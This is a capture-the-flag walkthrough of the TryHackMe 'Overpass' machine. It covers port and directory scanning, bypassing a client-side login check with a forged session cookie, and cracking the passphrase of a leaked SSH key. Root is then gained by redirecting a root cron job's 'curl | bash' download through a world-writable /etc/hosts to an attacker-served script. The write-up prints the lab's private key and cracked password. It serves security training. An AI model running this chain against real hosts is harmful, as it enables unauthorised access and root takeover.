# Overpass
![tryhackme_logo](https://user-images.githubusercontent.com/83867734/185771149-cb02c6f2-8476-4ab3-a626-cca8db0a08bf.png)

Difficulty: **Easy**

What happens when a group of broke Computer Science students try to make a password manager?
Obviously a perfect commercial success!

Tags
--
* Fuzzing
* Brute Forcing 
* Hash Cracking 
* Service Enumeration

Tools used
--
* nmap
* ffuf
* ssh2john
* john
* crontab

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Athena OS
* IP Address: 10.18.98.39

Victim:
* Name: victim_machine
* IP Address: 10.10.232.118
* Other information must be gathered during the attack

Phase 1: Enumeration
--
```
sudo nmap -sS -sC -sV 10.10.232.118 -p- -vvv

<SNIP>
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLYC7Hj7oNzKiSsLVMdxw3VZFyoPeS/qKWID8x9IWY71z3FfPijiU7h9IPC+9C+kkHPiled/u3cVUVHHe7NS68fdN1+LipJxVRJ4o3IgiT8mZ7RPar6wpKVey6kubr8JAvZWLxIH6JNB16t66gjUt3AHVf2kmjn0y8cljJuWRCJRo9xpOjGtUtNJqSjJ8T0vGIxWTV/sWwAOZ0/TYQAqiBESX+GrLkXokkcBXlxj0NV+r5t+Oeu/QdKxh3x99T9VYnbgNPJdHX4YxCvaEwNQBwy46515eBYCE05TKA2rQP8VTZjrZAXh7aE0aICEnp6pow6KQUAZr/6vJtfsX+Amn3
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMyyGnzRvzTYZnN1N4EflyLfWvtDU0MN/L+O4GvqKqkwShe5DFEWeIMuzxjhE0AW+LH4uJUVdoC0985Gy3z9zQU=
|   256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINwiYH+1GSirMK5KY0d3m7Zfgsr/ff1CP6p14fPa7JOR
80/tcp open  http    syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
|_http-favicon: Unknown favicon MD5: 0D4315E5A0B066CEFD5B216C8362564B
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
<SNIP>
```
Let's visit the HTTP service of the target. Here we can download the Overpass software. By reading the `overpass.go` file, we notice it uses ROT47 as encryption algorithm for storing passwords.

Let's try to check for other pages in the website. There is an About Us page showing the team. It could be good for identifying some users in the target application.

Let's use FFUF for checking for hidden resources:
```
ffuf -u http://10.10.232.118/FFUF -H 'Host: 10.10.232.118' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'DNT: 1' -H 'Sec-GPC: 1' -w /usr/share/payloads/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FFUF

<SNIP>
img                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 49ms]
downloads               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 41ms]
aboutus                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 43ms]
admin                   [Status: 301, Size: 42, Words: 3, Lines: 3, Duration: 38ms]
css                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
<SNIP>
```
By visiting `admin` path, we land on an authentication page.

Phase 2: Foothold
--
Trying some bruteforce with `admin` user and the names we found in About Us page, we cannot find any password. Use Burpsuite for additional information. If we intercept a login attempt by Burpsuite, we can note a POST request by `/api/login`:
```
POST /api/login HTTP/1.1
Host: 10.10.232.118
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: http://10.10.232.118
Content-Length: 29
Connection: close
DNT: 1
Sec-GPC: 1

username=admin&password=admin
```
and the respone returns `Incorrect credentials`.

If we go to the source code of the `/admin` page, we can note a `login.js` file. If we open it, we can see the following code:
```
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```
It means that, when the response contains the string `Incorrect Credentials`, the client does not authenticate. It seems the authentication is validated on the client side and not on the server side. This is an example of Broken Authentication. For bypassing it, we need to intercept the Response by Burpsuite and change that `Incorrect Credentials` string with any text.

If we do this, at our next HTTP login request we will have an additional header:
```
Cookie: SessionToken=randomstring
```
According to `login.js`, if the response DOES NOT contain `Incorrect Credentials`, `Cookie:` is set as above and the location of the request is `/admin`. It means we need to use `Cookie` header on a GET request to `/admin`:
```
GET /admin/ HTTP/1.1
Host: 10.10.232.118
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: http://10.10.232.118
Content-Length: 0
Connection: close
Cookie: SessionToken=randomstring
DNT: 1
Sec-GPC: 1


```
The response will contain the admin page of the website. Let's try to inject this request directly on the intercepted HTTP request so we can see the response on our browser.

The response will contain the SSH private key we can use for accessing to the target server:
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
```
From the page, we can also read a user called James. Let's try to authenticate by SSH with this key. Save it and then:
```
chmod 600 id_rsa
ssh 10.10.232.118 -i id_rsa -l james
Enter passphrase for key 'id_rsa': 
```
We need to retrieve the passphrase. Let's use John for cracking it:
```
python2 /usr/bin/ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --format=SSH --wordlist=rockyou.txt

<SNIP>
james13          (id_rsa)
<SNIP>
```
Now we can access by SSH with Kay username:
```
ssh -i id_rsa 10.10.232.118 -l james

sign_and_send_pubkey: signing failed for RSA "I don't have to type a long password anymore!" from agent: agent refused operation
Enter passphrase for key 'id_rsa':james13
```
Note: instead of prompt in the shell, you could get also a popup window asking passphrase.

Now we can retrieve immediately the user flag by `cat user.txt`.

Phase 3: Privilege Escalation
--
Let's copy LinPEAS on the target server and run it. One interesting part on LinPEAS output is:
```
<SNIP>
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
<SNIP>
```
So we see that `buildscript.sh` is run as root. `overpass.thm` is interesting. Let's give a look on `/etc/hosts` file:
```
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
Since we cannot access to the location where `buildscript.sh` file is stored, we note that `/etc/hosts` file has write permission for all users:
```
ll /etc/hosts
-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
```
Let's edit it and make a HTTP server in order to run our custom buildscript. Let's create the following buildscript in our attacker machine in the `downloads/src/buildscript.sh` path inside the root of our small HTTP server:
```
cp -rf /root/root.txt /home/james/
chmod +r /home/james/root.txt
```
Then, on the target machine edit the line containing `overpass.thm` with the attacker machine IP address:
```
127.0.0.1 localhost
127.0.1.1 overpass-prod
10.18.98.39 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
save the file. Then, run the HTTP server on the port 80 on the attacker machine on the folder containing `downloads/src/buildscript.sh` you created the custom script:
```
sudo python -m http.server 80

[sudo] password for athena: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.232.118 - - [21/Aug/2022 18:25:01] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
10.10.232.118 - - [21/Aug/2022 18:26:01] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
10.10.232.118 - - [21/Aug/2022 18:27:01] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
10.10.232.118 - - [21/Aug/2022 18:28:00] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
10.10.232.118 - - [21/Aug/2022 18:29:01] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
10.10.232.118 - - [21/Aug/2022 18:30:01] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
```
You can stop the server and go to the target machine for checking if the root flag has been copied on the james home folder.